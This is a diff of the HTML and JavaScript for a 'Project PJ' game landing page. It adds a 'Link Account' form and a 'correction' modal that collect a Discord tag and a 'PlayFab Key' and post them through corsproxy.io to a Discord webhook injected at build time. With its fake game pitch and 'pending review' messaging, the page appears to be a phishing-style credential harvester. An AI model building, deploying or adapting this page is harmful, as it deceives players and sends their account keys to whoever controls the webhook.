@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PROJECT PJ | The Link</title>
+    <title>PROJECT PJ</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -13,6 +13,7 @@
             --accent: #00ff88;
             --accent-glow: rgba(0, 255, 136, 0.5);
             --danger: #ff4444;
+            --warning: #ffaa00;
             --bg: #050505;
             --surface: rgba(15, 15, 20, 0.85);
             --border: rgba(255, 255, 255, 0.1);
@@ -29,198 +30,249 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
-        /* Cyber Grid Background */
+        /* Backgrounds */
         .bg-grid {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background-image: 
                 linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
-            background-size: 30px 30px;
-            z-index: -1;
+            background-size: 30px 30px; z-index: -2;
+        }
+        .bg-glow {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 800px; height: 800px;
+            background: radial-gradient(circle, rgba(0,255,136,0.05) 0%, transparent 60%);
+            z-index: -1; pointer-events: none;
         }
 
-        .container {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
+        /* View Containers */
+        .view-container {
+            width: 100%; max-width: 500px; padding: 20px;
+            display: none; opacity: 0; transform: translateY(20px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
         }
+        .view-container.active { display: block; opacity: 1; transform: translateY(0); }
 
+        /* Typography */
         .header-box { text-align: center; margin-bottom: 2rem; }
-
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.5rem;
-            letter-spacing: 5px;
-            text-shadow: 0 0 15px rgba(255,255,255,0.5);
-        }
-
-        .subtitle {
-            color: var(--accent);
-            letter-spacing: 3px;
-            font-size: 0.8rem;
-            font-weight: 700;
-        }
-
-        #clock {
-            font-family: 'Orbitron', monospace;
-            font-size: 0.75rem;
-            color: #888;
-            margin-top: 5px;
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; letter-spacing: 5px; text-shadow: 0 0 15px rgba(255,255,255,0.3); }
+        .subtitle { color: var(--accent); letter-spacing: 3px; font-size: 0.9rem; font-weight: 700; margin-bottom: 10px; }
+        
+        /* Game Info Text */
+        .game-info {
+            background: rgba(0,0,0,0.4); border-left: 3px solid var(--accent);
+            padding: 1.5rem; margin-bottom: 2rem; font-size: 1.1rem; line-height: 1.6;
+            color: #ddd; text-align: left; border-radius: 0 8px 8px 0;
         }
 
         .card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 2rem;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
+            background: var(--surface); border: 1px solid var(--border);
+            border-radius: 12px; padding: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px); position: relative;
         }
 
-        .btn-discord {
-            background: var(--primary);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 1rem;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: 0.3s;
-            margin-bottom: 1.5rem;
-            width: 100%;
+        /* Buttons */
+        .btn {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            padding: 1rem; border-radius: 6px; text-decoration: none; font-weight: bold;
+            text-transform: uppercase; letter-spacing: 1.5px; transition: 0.3s;
+            width: 100%; font-family: 'Orbitron', sans-serif; cursor: pointer; border: none;
         }
-        .btn-discord:hover { background: var(--primary-hover); }
-
-        .input-group { margin-bottom: 1.2rem; }
         
-        label {
-            display: block;
-            font-size: 0.75rem;
-            color: #aaa;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        .btn-download {
+            background: var(--primary); color: white; margin-bottom: 1rem;
+            box-shadow: 0 0 15px rgba(88, 101, 242, 0.4);
+            animation: pulse 2s infinite;
         }
+        .btn-download:hover { background: var(--primary-hover); transform: scale(1.02); }
+        
+        .btn-link-nav { background: transparent; color: var(--accent); border: 1px solid var(--accent); }
+        .btn-link-nav:hover { background: rgba(0, 255, 136, 0.1); box-shadow: 0 0 15px var(--accent-glow); }
 
+        .btn-submit { background: var(--accent); color: #000; margin-top: 10px; }
+        .btn-submit:hover:not(:disabled) { box-shadow: 0 0 15px var(--accent-glow); transform: translateY(-2px); }
+        .btn-submit:disabled { background: #333; color: #666; cursor: not-allowed; }
+
+        .btn-back { background: transparent; color: #888; border: 1px solid #333; margin-bottom: 1.5rem; font-size: 0.8rem; }
+        .btn-back:hover { color: #fff; border-color: #666; }
+        .btn-warning { background: var(--warning); color: #000; margin-top: 15px; font-size: 0.85rem; }
+
+        /* Forms */
+        .input-group { margin-bottom: 1.2rem; text-align: left; }
+        label { display: block; font-size: 0.75rem; color: #aaa; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
         input {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: #fff;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.9rem;
-            transition: 0.3s;
-            outline: none;
+            width: 100%; padding: 12px; background: rgba(0,0,0,0.5);
+            border: 1px solid var(--border); border-radius: 6px;
+            color: #fff; font-family: 'Orbitron', sans-serif; font-size: 0.9rem;
+            transition: 0.3s; outline: none;
         }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
 
-        input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 10px var(--accent-glow);
+        /* States & Modals */
+        .hidden { display: none !important; }
+        #lockoutState { text-align: center; padding: 20px 0; }
+        #lockoutState i { font-size: 3rem; color: var(--accent); margin-bottom: 15px; }
+        #lockoutState p { color: #aaa; font-size: 0.9rem; margin-bottom: 20px; }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
+            display: flex; align-items: center; justify-content: center; z-index: 100;
+            opacity: 0; visibility: hidden; transition: 0.3s;
         }
-
-        .btn-submit {
-            width: 100%;
-            padding: 1rem;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            border-radius: 6px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-            margin-top: 10px;
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        .modal-content {
+            background: var(--bg); border: 1px solid var(--warning); border-radius: 12px;
+            padding: 2rem; width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 170, 0, 0.2);
         }
+        .close-btn { float: right; cursor: pointer; color: #aaa; font-size: 1.2rem; }
+        .close-btn:hover { color: #fff; }
 
-        .btn-submit:hover:not(:disabled) {
-            box-shadow: 0 0 15px var(--accent-glow);
-            transform: translateY(-2px);
-        }
-
-        .btn-submit:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-        }
-
-        /* Terminal Output Box */
+        /* Terminal */
         .terminal {
-            margin-top: 1.5rem;
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 6px;
-            padding: 10px;
-            height: 100px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 0.75rem;
-            color: #aaa;
-            display: none;
+            margin-top: 1.5rem; background: #000; border: 1px solid #333; border-radius: 6px;
+            padding: 10px; height: 100px; overflow-y: auto; font-family: monospace;
+            font-size: 0.75rem; color: #aaa; display: none; text-align: left;
         }
-        
         .terminal p { margin: 2px 0; }
         .log-success { color: var(--accent); }
         .log-error { color: var(--danger); }
-        .log-warn { color: yellow; }
 
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(88, 101, 242, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(88, 101, 242, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(88, 101, 242, 0); }
+        }
     </style>
 </head>
 <body>
     <div class="bg-grid"></div>
+    <div class="bg-glow"></div>
 
-    <div class="container">
+    <div id="landingView" class="view-container active">
         <div class="header-box">
             <h1>PROJECT PJ</h1>
-            <div class="subtitle">SECURITY INTERFACE V.2.06</div>
-            <div id="clock">SYS.TIME: 00:00:00</div>
+            <div class="subtitle">A NEW ERA OF COMBAT</div>
         </div>
 
         <div class="card">
-            <a href="https://discord.gg/YvAbSsEUfN" target="_blank" class="btn-discord">
-                <i class="fab fa-discord"></i> Connect Identity
-            </a>
+            <div class="game-info">
+                Welcome to <strong>Project PJ</strong>. Engage in high-stakes tactical warfare, outmaneuver your opponents, and climb the global leaderboards. Experience fluid movement, advanced weaponry, and continuous updates.
+            </div>
 
-            <form id="linkForm">
-                <div class="input-group">
-                    <label>Discord Tag</label>
-                    <input type="text" id="discord" placeholder="Username#0000" required>
-                </div>
-                <div class="input-group">
-                    <label>PlayFab Key</label>
-                    <input type="text" id="playfab" placeholder="ENTER KEY" required>
-                </div>
-                <button type="submit" class="btn-submit" id="submitBtn">
-                    <i class="fas fa-link"></i> Execute Link
+            <a href="https://discord.gg/YvAbSsEUfN" target="_blank" class="btn btn-download">
+                <i class="fas fa-download"></i> Download Game
+            </a>
+            
+            <button class="btn btn-link-nav" onclick="switchView('linkerView')">
+                <i class="fas fa-link"></i> Link Account
+            </button>
+        </div>
+    </div>
+
+    <div id="linkerView" class="view-container">
+        <div class="header-box">
+            <h1>AUTHORIZE</h1>
+            <div class="subtitle">SECURITY INTERFACE V.2.06</div>
+        </div>
+
+        <div class="card">
+            <button class="btn btn-back" onclick="switchView('landingView')">
+                <i class="fas fa-arrow-left"></i> Return to Main Database
+            </button>
+
+            <div id="mainFormContainer">
+                <form id="linkForm">
+                    <div class="input-group">
+                        <label>Discord Tag</label>
+                        <input type="text" id="discord" placeholder="Username#0000" required>
+                    </div>
+                    <div class="input-group">
+                        <label>PlayFab Key</label>
+                        <input type="text" id="playfab" placeholder="ENTER KEY" required>
+                    </div>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">
+                        <i class="fas fa-satellite-dish"></i> Execute Link
+                    </button>
+                </form>
+            </div>
+
+            <div id="lockoutState" class="hidden">
+                <i class="fas fa-shield-check"></i>
+                <h2 style="font-family: 'Orbitron'; margin-bottom: 10px;">DATA TRANSMITTED</h2>
+                <p>Your authorization request is pending review in the mainframe.</p>
+                <button class="btn btn-warning" id="openModalBtn">
+                    <i class="fas fa-exclamation-triangle"></i> Made a mistake?
                 </button>
-            </form>
+            </div>
 
             <div class="terminal" id="terminal"></div>
         </div>
     </div>
 
-    <script>
-        // Live Clock
-        setInterval(() => {
-            const now = new Date();
-            document.getElementById('clock').innerText = `SYS.TIME: ${now.toLocaleTimeString()}`;
-        }, 1000);
+    <div class="modal-overlay" id="correctionModal">
+        <div class="modal-content">
+            <span class="close-btn" id="closeModalBtn"><i class="fas fa-times"></i></span>
+            <h2 style="font-family: 'Orbitron'; color: var(--warning); margin-bottom: 15px;">CORRECTION PROTOCOL</h2>
+            <p style="font-size: 0.8rem; color: #aaa; margin-bottom: 20px;">Submit the corrected information below. This action can only be performed once.</p>
+            
+            <form id="correctionForm">
+                <div class="input-group">
+                    <label>Corrected Discord Tag</label>
+                    <input type="text" id="corrDiscord" required>
+                </div>
+                <div class="input-group">
+                    <label>Corrected PlayFab Key</label>
+                    <input type="text" id="corrPlayfab" required>
+                </div>
+                <button type="submit" class="btn btn-warning" style="width: 100%; padding: 1rem; border: none; font-weight: bold; cursor: pointer; border-radius: 6px;" id="corrSubmitBtn">UPDATE RECORDS</button>
+            </form>
+        </div>
+    </div>
 
+    <script>
+        // --- VIEW SWITCHING LOGIC ---
+        function switchView(targetId) {
+            document.querySelectorAll('.view-container').forEach(view => {
+                view.classList.remove('active');
+                setTimeout(() => view.style.display = 'none', 400); // Wait for fade out
+            });
+            
+            setTimeout(() => {
+                const target = document.getElementById(targetId);
+                target.style.display = 'block';
+                // Trigger reflow to ensure animation runs
+                void target.offsetWidth; 
+                target.classList.add('active');
+            }, 400);
+        }
+
+        // --- WEBHOOK LOGIC ---
         const form = document.getElementById('linkForm');
-        const submitBtn = document.getElementById('submitBtn');
+        const mainFormContainer = document.getElementById('mainFormContainer');
+        const lockoutState = document.getElementById('lockoutState');
         const terminal = document.getElementById('terminal');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        const modal = document.getElementById('correctionModal');
+        const openModalBtn = document.getElementById('openModalBtn');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const correctionForm = document.getElementById('correctionForm');
+        const corrSubmitBtn = document.getElementById('corrSubmitBtn');
+
+        const rawWebhook = "REPLACE_WITH_WEBHOOK";
+        const proxiedWebhook = `https://corsproxy.io/?${encodeURIComponent(rawWebhook)}`;
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if (localStorage.getItem('pj_status') === 'submitted') {
+                showLockout();
+            } else if (localStorage.getItem('pj_status') === 'corrected') {
+                showLockout(true); 
+            }
+        });
 
         function log(msg, type = '') {
             terminal.style.display = 'block';
@@ -231,65 +283,95 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
+        function showLockout(fullyLocked = false) {
+            mainFormContainer.classList.add('hidden');
+            lockoutState.classList.remove('hidden');
+            terminal.style.display = 'none';
+            if (fullyLocked) {
+                openModalBtn.disabled = true;
+                openModalBtn.innerText = "MAXIMUM CORRECTIONS REACHED";
+                openModalBtn.style.background = "#333";
+                openModalBtn.style.color = "#666";
+            }
+        }
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const discord = document.getElementById('discord').value.trim();
-            const playfab = document.getElementById('playfab').value.trim();
-
-            // Reset Terminal
-            terminal.innerHTML = '';
             submitBtn.disabled = true;
-
+            terminal.innerHTML = '';
             log('INITIALIZING SECURE UPLINK...');
-            
-            // This MUST be replaced by your GitHub Action
-            const rawWebhook = "REPLACE_WITH_WEBHOOK";
-
-            if (rawWebhook.includes("REPLACE_WITH")) {
-                log('FATAL: WEBHOOK NOT INJECTED BY GITHUB ACTIONS.', 'error');
-                submitBtn.disabled = false;
-                return;
-            }
-
-            // Route through CORS Proxy to bypass Discord browser block
-            const proxiedWebhook = `https://corsproxy.io/?${encodeURIComponent(rawWebhook)}`;
 
             const payload = {
                 embeds: [{
                     title: "🔐 System Authorization Request",
-                    color: 65280,
+                    color: 65280, 
                     fields: [
-                        { name: "Discord", value: "`" + discord + "`", inline: true },
-                        { name: "PlayFab", value: "`" + playfab + "`", inline: true }
+                        { name: "Discord", value: "`" + document.getElementById('discord').value + "`", inline: true },
+                        { name: "PlayFab", value: "`" + document.getElementById('playfab').value + "`", inline: true }
                     ],
-                    footer: { text: "PJ Security System" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            setTimeout(async () => {
-                log('VALIDATING CREDENTIALS...', 'warn');
-                try {
-                    const res = await fetch(proxiedWebhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
+            try {
+                const res = await fetch(proxiedWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
 
-                    if (res.ok) {
-                        log('UPLINK SUCCESSFUL. DATA TRANSMITTED.', 'success');
-                        form.reset();
-                    } else {
-                        throw new Error(`HTTP ${res.status}`);
-                    }
-                } catch (err) {
-                    log(`TRANSMISSION FAILED: ${err.message}`, 'error');
-                } finally {
-                    submitBtn.disabled = false;
-                }
-            }, 800); // Fake delay for cool terminal effect
+                if (res.ok) {
+                    log('UPLINK SUCCESSFUL.', 'success');
+                    localStorage.setItem('pj_status', 'submitted');
+                    setTimeout(() => showLockout(), 1500);
+                } else throw new Error(res.status);
+            } catch (err) {
+                log(`TRANSMISSION FAILED: HTTP ${err.message}`, 'error');
+                submitBtn.disabled = false;
+            }
+        });
+
+        // --- MODAL LOGIC ---
+        openModalBtn.addEventListener('click', () => modal.classList.add('active'));
+        closeModalBtn.addEventListener('click', () => modal.classList.remove('active'));
+        window.addEventListener('click', (e) => {
+            if (e.target === modal) modal.classList.remove('active');
+        });
+
+        correctionForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            corrSubmitBtn.disabled = true;
+            corrSubmitBtn.innerText = "UPDATING...";
+
+            const payload = {
+                embeds: [{
+                    title: "⚠️ CORRECTION PROTOCOL INITIATED",
+                    color: 16755200, 
+                    fields: [
+                        { name: "New Discord", value: "`" + document.getElementById('corrDiscord').value + "`", inline: true },
+                        { name: "New PlayFab", value: "`" + document.getElementById('corrPlayfab').value + "`", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const res = await fetch(proxiedWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (res.ok) {
+                    localStorage.setItem('pj_status', 'corrected');
+                    modal.classList.remove('active');
+                    showLockout(true);
+                } else throw new Error();
+            } catch (err) {
+                corrSubmitBtn.innerText = "ERROR - TRY AGAIN";
+                corrSubmitBtn.disabled = false;
+            }
         });
     </script>
 </body>
 </html>
-
